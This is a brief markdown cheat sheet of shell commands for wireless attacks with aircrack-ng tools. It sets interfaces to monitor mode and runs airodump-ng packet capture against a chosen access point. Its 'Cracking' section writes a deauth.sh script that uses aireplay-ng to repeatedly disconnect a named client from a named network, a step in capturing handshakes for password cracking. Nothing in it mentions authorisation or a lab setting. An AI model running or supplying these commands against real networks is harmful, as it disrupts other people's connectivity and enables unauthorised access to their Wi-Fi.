## Driver
```bash
https://github.com/aircrack-ng/rtl8812au
```

## Settings
```bash
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

ip link set wlan1 down
iw dev wlan1 set type monitor
ip link set wlan1 up
```

## Monitor

### Generic
```bash
airodump-ng --manufacturer --beacons --showack --wps --uptime --band a wlan0
airodump-ng --manufacturer --beacons --showack --wps --uptime --band bg wlan0
```

```bash
airodump-ng --manufacturer --beacons --showack --wps --uptime \
            --write-interval 5 --output-format pcap --write session0 \
            --band bg wlan0
```

### Target
```bash
airodump-ng --manufacturer --beacons --showack --wps --uptime \
            --bssid CHANGEME --channel 1 wlan0
```

```bash
airodump-ng --manufacturer --beacons --showack --wps --uptime \
            --write-interval 5 --output-format pcap --write session0 \
            --bssid CHANGEME --channel 1 wlan0
```

## Cracking
```bash
iwconfig wlan1 channel 4

cat >> deauth.sh << "EndOfMessage"
aireplay-ng -0 99 -D -a $1 -c $2 wlan1
EndOfMessage

chmod +x deauth.sh
```

## Kill View
```bash
kill -9 `ps aux | grep -i aircrack | awk '{print $2}'`
```
